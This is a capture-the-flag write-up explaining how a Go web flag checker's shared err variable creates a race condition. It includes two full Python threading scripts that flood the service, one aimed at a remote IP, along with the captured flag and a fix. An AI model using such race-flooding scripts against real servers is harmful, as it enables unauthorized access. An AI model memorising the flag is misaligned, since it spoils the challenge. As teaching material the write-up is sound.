# Web Challenge 2: No Skill Just Luck - Writeup

**Author:** marlithor-cyber
**Challenge Name:** No skill just luck
**Category:** Web
**Difficulty:** Medium

## Challenge Description

This challenge presented a simple web application with a flag checker. The interface was straightforward - you submit a flag, and if it's correct, you get... well, the correct flag. The challenge name "No skill just luck" was a huge hint about what we were dealing with.

## Initial Analysis

When I first accessed the challenge, I saw a basic web form asking for a flag input. The application stack consisted of:
- **Frontend**: Simple HTML template (`service/templates/index.html`)
- **Backend**: Go application (`service/main.go`)
- **Proxy**: nginx (`nginx/default.conf`)

My first instinct was to look for common web vulnerabilities - SQL injection, XSS, SSRF, etc. I noticed there was an `isLocalRequest()` function that checked the `X-Forwarded-For` header, which seemed like a potential attack vector.

## Diving Into the Source Code

I started examining `service/main.go` more carefully. The code structure looked simple enough:

```go
func main() {
    var err error
    ...
    http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
        // handler code
    })
}
```

Wait a minute... that `var err error` is declared outside the handler function, and the handler is a closure that references it. This means **all concurrent requests share the same `err` variable**!

### The POST Handler Logic

For POST requests with a flag submission, the code does:

```go
err = checkFlag(flag)
if err != nil {
    err = tmpl.Execute(w, map[string]interface{}{
        "Error": "Invalid flag",
    })
    return
}
err = tmpl.Execute(w, map[string]interface{}{
    "Success": true,
    "Flag":    FLAG,
})
```

For GET requests, it simply does:

```go
err = tmpl.Execute(w, map[string]interface{}{})
```

## The "Aha!" Moment

This is a textbook race condition! Here's what can happen:

1. **Thread A** (POST with wrong flag): Calls `checkFlag(flag)`, which sets `err` to a non-nil error
2. **Thread B** (GET request): Executes `tmpl.Execute()` successfully, setting `err` to `nil`
3. **Thread A** continues: Checks `if err != nil` - but now `err` is `nil` because Thread B overwrote it!
4. **Thread A** falls through to the success branch and renders the real flag

The challenge name suddenly made sense - "No skill just luck" - because we need to win a race condition!

## Testing Locally

Before attacking the remote server, I wanted to verify my theory locally. I spun up the Docker environment:

```bash
docker-compose up
```

The local instance uses a placeholder flag `LB{REDACTED}`, which is perfect for testing.

### Building the Exploit

I wrote a Python script that spawns multiple threads:
- Some threads continuously send GET requests
- Other threads continuously send POST requests with an invalid flag

The idea is to create enough concurrent traffic that eventually, a GET request will overwrite `err` at just the right moment.

```python
import threading, requests, time

URL = "http://127.0.0.1:1924/"
found = []
stop = False
session = requests.Session()

def spam_get():
    global stop
    while not stop:
        try:
            session.get(URL, timeout=1)
        except Exception:
            pass

def spam_post():
    global stop
    while not stop:
        try:
            r = session.post(URL, data={"flag": "LB{nope}"}, timeout=1)
            if "Correct! Here is your flag:" in r.text:
                found.append(r.text)
                stop = True
                return
        except Exception:
            pass

threads = []
for _ in range(20):
    t = threading.Thread(target=spam_get, daemon=True)
    t.start()
    threads.append(t)

for _ in range(20):
    t = threading.Thread(target=spam_post, daemon=True)
    t.start()
    threads.append(t)

start = time.time()
while time.time() - start < 10 and not stop:
    time.sleep(0.1)

print(found[0] if found else "no flag")
```

Running this locally, I got the placeholder flag within seconds! The race condition was real and exploitable.

## Attacking the Remote Server

Now it was time to attack the actual challenge server. I modified my exploit script to:
1. Target the remote URL: `http://158.160.221.45:1924/`
2. Use thread-local sessions for better performance
3. Increase the number of worker threads to 40 each
4. Add regex extraction to cleanly grab the flag

```python
import threading, requests, time, re

URL = "http://158.160.221.45:1924/"
found = []
stop = False
thread_local = threading.local()

def sess():
    if not hasattr(thread_local, "s"):
        thread_local.s = requests.Session()
    return thread_local.s

def spam_get():
    global stop
    while not stop:
        try:
            sess().get(URL, timeout=2)
        except Exception:
            pass

def spam_post():
    global stop
    while not stop:
        try:
            r = sess().post(URL, data={"flag": "LB{nope}"}, timeout=2)
            if "Correct! Here is your flag:" in r.text:
                m = re.search(r"LB\{[^<\s]+\}", r.text)
                found.append(m.group(0) if m else r.text)
                stop = True
                return
        except Exception:
            pass

threads = []
for _ in range(40):
    t = threading.Thread(target=spam_get, daemon=True)
    t.start()
    threads.append(t)

for _ in range(40):
    t = threading.Thread(target=spam_post, daemon=True)
    t.start()
    threads.append(t)

start = time.time()
while time.time() - start < 30 and not stop:
    time.sleep(0.05)

print(found[0] if found else "NOFLAG")
```

I ran the script and watched the threads hammer the server with requests. After about 5-10 seconds...

## Flag

```text
LB{761201b446ac76c2954db53e086d9d6d}
```

Success! The race condition worked perfectly on the remote server.

## Root Cause Analysis

The vulnerability exists because of a fundamental mistake in Go concurrency:

**Shared Mutable State**: The `err` variable is declared in the outer scope and shared across all concurrent HTTP handler invocations. Go's HTTP server handles each request in a separate goroutine, so multiple goroutines are reading and writing the same variable without any synchronization.

### Why This Is Dangerous

In Go, the correct pattern is to declare variables inside the handler function, making them request-local:

```go
// WRONG - shared across requests
var err error
http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
    err = doSomething() // Race condition!
})

// CORRECT - local to each request
http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
    err := doSomething() // Safe
})
```

## What About isLocalRequest()?

I initially thought the `isLocalRequest()` function and `X-Forwarded-For` header handling might be the vulnerability. While that code is indeed sloppy and could potentially be bypassed, it wasn't necessary for solving the challenge. The race condition was the intended (and easier) path.

## Lessons Learned

This challenge teaches several important concepts:

1. **Concurrency bugs are subtle**: The code looks fine at first glance, but becomes dangerous when multiple requests execute simultaneously
2. **Race conditions are exploitable**: With enough attempts, you can win the race and trigger the vulnerable code path
3. **Variable scope matters**: In concurrent environments, always use request-local variables
4. **Challenge names are hints**: "No skill just luck" directly pointed to the race condition nature of the exploit

## Mitigation

The fix is simple - move the `err` variable declaration inside the handler:

```go
http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
    var err error  // Now request-local
    // ... rest of handler
})
```

Alternatively, use proper synchronization (mutexes) if shared state is truly necessary, though that's overkill for this use case.

## Conclusion

This was a great challenge that demonstrated how subtle concurrency bugs can lead to serious security vulnerabilities. The race condition allowed us to bypass the flag check entirely by manipulating shared state at just the right moment. Sometimes in security, you really do need a bit of luck - but understanding the underlying vulnerability helps you make your own luck!
